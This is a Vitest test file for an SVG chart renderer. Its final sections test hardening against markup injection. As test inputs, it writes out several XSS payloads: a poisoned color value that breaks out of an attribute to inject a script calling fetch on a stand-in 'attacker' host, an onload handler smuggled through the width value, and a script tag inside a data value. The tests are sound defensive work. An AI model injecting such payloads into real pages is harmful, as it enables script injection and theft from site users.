/* eslint-disable testing-library/render-result-naming-convention */
import { describe, it, expect } from 'vitest';
import { renderChartSvg, type ChartRendererInput } from './chartRenderer';

// ── Helpers ───────────────────────────────────────────────────────────────────

function isSvg(s: string): boolean {
  return s.trimStart().startsWith('<svg') && s.includes('</svg>');
}

function countTag(svg: string, tag: string): number {
  return (svg.match(new RegExp(`<${tag}[\\s/>]`, 'g')) ?? []).length;
}

const SIMPLE_DATA = [
  { label: 'A', value: 10 },
  { label: 'B', value: 25 },
  { label: 'C', value: 15 },
];

// ── Bar chart ─────────────────────────────────────────────────────────────────

describe('renderChartSvg — bar', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders one rect per data point', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    expect(countTag(svg, 'rect')).toBe(SIMPLE_DATA.length);
  });

  it('includes the title when provided', () => {
    const svg = renderChartSvg({ type: 'bar', title: 'My Bar Chart', data: SIMPLE_DATA });
    expect(svg).toContain('My Bar Chart');
  });

  it('includes axis lines', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    // Two axis lines (x and y)
    expect(countTag(svg, 'line')).toBeGreaterThanOrEqual(2);
  });

  it('respects custom dimensions', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA, width: 800, height: 500 });
    expect(svg).toContain('width="800"');
    expect(svg).toContain('height="500"');
  });

  it('uses custom colors', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: ['#ff0000', '#00ff00', '#0000ff'],
    });
    expect(svg).toContain('#ff0000');
    expect(svg).toContain('#00ff00');
  });

  it('handles a single data point', () => {
    const svg = renderChartSvg({ type: 'bar', data: [{ label: 'Only', value: 42 }] });
    expect(isSvg(svg)).toBe(true);
    expect(countTag(svg, 'rect')).toBe(1);
  });

  it('escapes HTML special characters in labels', () => {
    const svg = renderChartSvg({ type: 'bar', data: [{ label: '<script>', value: 1 }] });
    expect(svg).not.toContain('<script>');
    expect(svg).toContain('&lt;script&gt;');
  });
});

// ── Line chart ────────────────────────────────────────────────────────────────

describe('renderChartSvg — line', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders a polyline element', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(countTag(svg, 'polyline')).toBeGreaterThanOrEqual(1);
  });

  it('renders dots (circles) for each data point', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(countTag(svg, 'circle')).toBe(SIMPLE_DATA.length);
  });

  it('supports multi-series with xLabels + series', () => {
    const svg = renderChartSvg({
      type: 'line',
      title: 'Multi-series',
      xLabels: ['Q1', 'Q2', 'Q3'],
      series: [
        { name: 'Product A', values: [100, 150, 130] },
        { name: 'Product B', values: [80, 90, 120] },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(countTag(svg, 'polyline')).toBe(2);
    expect(svg).toContain('Product A');
    expect(svg).toContain('Product B');
  });

  it('renders a legend for multi-series charts', () => {
    const svg = renderChartSvg({
      type: 'line',
      xLabels: ['Jan', 'Feb'],
      series: [
        { name: 'Series1', values: [1, 2] },
        { name: 'Series2', values: [3, 4] },
      ],
    });
    expect(svg).toContain('Series1');
    expect(svg).toContain('Series2');
  });

  it('falls back gracefully when no data is provided', () => {
    const svg = renderChartSvg({ type: 'line' });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
  });
});

// ── Pie chart ─────────────────────────────────────────────────────────────────

describe('renderChartSvg — pie', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders one path (slice) per data point', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(countTag(svg, 'path')).toBe(SIMPLE_DATA.length);
  });

  it('includes label text in the legend', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    for (const d of SIMPLE_DATA) {
      expect(svg).toContain(d.label);
    }
  });

  it('includes percentage in the legend', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(svg).toContain('%');
  });

  it('includes the title when provided', () => {
    const svg = renderChartSvg({ type: 'pie', title: 'Market Share', data: SIMPLE_DATA });
    expect(svg).toContain('Market Share');
  });

  it('skips zero-value slices', () => {
    const data = [
      { label: 'A', value: 10 },
      { label: 'B', value: 0 },
      { label: 'C', value: 20 },
    ];
    const svg = renderChartSvg({ type: 'pie', data });
    // Only 2 non-zero slices
    expect(countTag(svg, 'path')).toBe(2);
  });
});

// ── Error handling ────────────────────────────────────────────────────────────

describe('renderChartSvg — errors', () => {
  it('throws for an unknown chart type', () => {
    expect(() => renderChartSvg({ type: 'radar' as never })).toThrow(/unknown chart type/i);
  });
});

// ── Security: attribute/markup injection (finding 1.3) ──────────────────────────

describe('renderChartSvg — injection hardening', () => {
  const POISONED_COLOR = 'red" /><script>fetch("https://attacker/x")</script><rect fill="red';

  it('drops a poisoned colors entry so no <script> can be injected', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: [POISONED_COLOR],
    });
    // The dangerous markup must be entirely absent from the output — not merely
    // re-escaped. The poisoned fill is replaced with a safe default color.
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain('</script>');
    expect(svg).not.toContain('fetch(');
    expect(svg).not.toContain(POISONED_COLOR);
    // A valid default hex color is used in its place.
    expect(svg).toMatch(/fill="#[0-9a-fA-F]{3,8}"/);
  });

  it('sanitizes poisoned colors across every chart type', () => {
    const inputs: ChartRendererInput[] = [
      { type: 'bar', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'line', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'pie', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'donut', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      {
        type: 'scatter',
        data: [
          { label: '1', value: 5 },
          { label: '2', value: 8 },
        ],
        colors: [POISONED_COLOR],
      },
      {
        type: 'stacked_bar',
        xLabels: ['Q1', 'Q2'],
        series: [{ name: 'A', values: [1, 2] }],
        colors: [POISONED_COLOR],
      },
    ];
    for (const input of inputs) {
      const svg = renderChartSvg(input);
      expect(svg, `chart type ${input.type}`).not.toContain('<script');
      expect(svg, `chart type ${input.type}`).not.toContain('fetch(');
      expect(svg, `chart type ${input.type}`).not.toContain(POISONED_COLOR);
    }
  });

  it('keeps valid hex colors and replaces only the poisoned entry', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: ['#ff0000', POISONED_COLOR, '#0000ff'],
    });
    // Valid entries survive.
    expect(svg).toContain('#ff0000');
    expect(svg).toContain('#0000ff');
    // The poisoned entry is gone; a safe default takes its slot (index 1).
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain(POISONED_COLOR);
    expect(svg).toContain('#f28e2b'); // DEFAULT_COLORS[1]
  });

  it('falls back to default dimensions for a non-numeric width/height', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      width: '600" onload="alert(1)' as unknown as number,
      height: Number.NaN,
    });
    expect(svg).toContain('width="600"');
    expect(svg).toContain('height="400"');
    expect(svg).not.toContain('onload');
  });

  it('falls back to default dimensions for absurdly large values', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      width: 10 ** 12,
      height: -50,
    });
    expect(svg).toContain('width="600"');
    expect(svg).toContain('height="400"');
    expect(svg).not.toContain('1000000000000');
  });

  it('still honors valid custom dimensions', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA, width: 800, height: 500 });
    expect(svg).toContain('width="800"');
    expect(svg).toContain('height="500"');
  });

  it('coerces a string data value so the donut centre total cannot inject markup', () => {
    // `value` is typed `number` but never validated at runtime. A string value
    // previously flowed into `total.toLocaleString()` as raw text content.
    const svg = renderChartSvg({
      type: 'donut',
      title: 'ok',
      data: [{ label: 'x', value: '5</text><script>alert(1)</script>' as unknown as number }],
    });
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain('</script>');
    expect(svg).not.toContain('alert(1)');
  });

  it('coerces a non-numeric bar value to 0 rather than producing NaN geometry', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: [
        { label: 'A', value: 10 },
        { label: 'B', value: 'not-a-number' as unknown as number },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).not.toContain('NaN');
  });

  it('does not throw on a non-array colors value (coerces to defaults)', () => {
    // `colors` is typed `string[]` but is model-supplied and never validated; a
    // non-array value previously threw a raw `TypeError` inside `.map` on the public
    // `renderChartSvg` export (finding 2.1).
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'bar',
        data: SIMPLE_DATA,
        colors: '#fff' as unknown as string[],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    // Falls back to the default palette.
    expect(svg).toContain('#4e79a7'); // DEFAULT_COLORS[0]
  });

  it('does not throw on a non-array data value (renders the No-data placeholder)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({ type: 'bar', data: {} as unknown as ChartRendererInput['data'] });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
  });

  it('does not throw on a non-array series value', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'stacked_bar',
        xLabels: ['Q1', 'Q2'],
        series: 'x' as unknown as ChartRendererInput['series'],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
  });
});

// ── No-data / all-non-positive guards (finding 3.3) ─────────────────────────────

describe('renderChartSvg — empty / non-positive data guards', () => {
  it('renders a "No data" placeholder for a bar chart with no data points', () => {
    const svg = renderChartSvg({ type: 'bar', data: [] });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a bar chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: [
        { label: 'A', value: 0 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a donut chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'donut',
      data: [
        { label: 'A', value: 0 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });
});
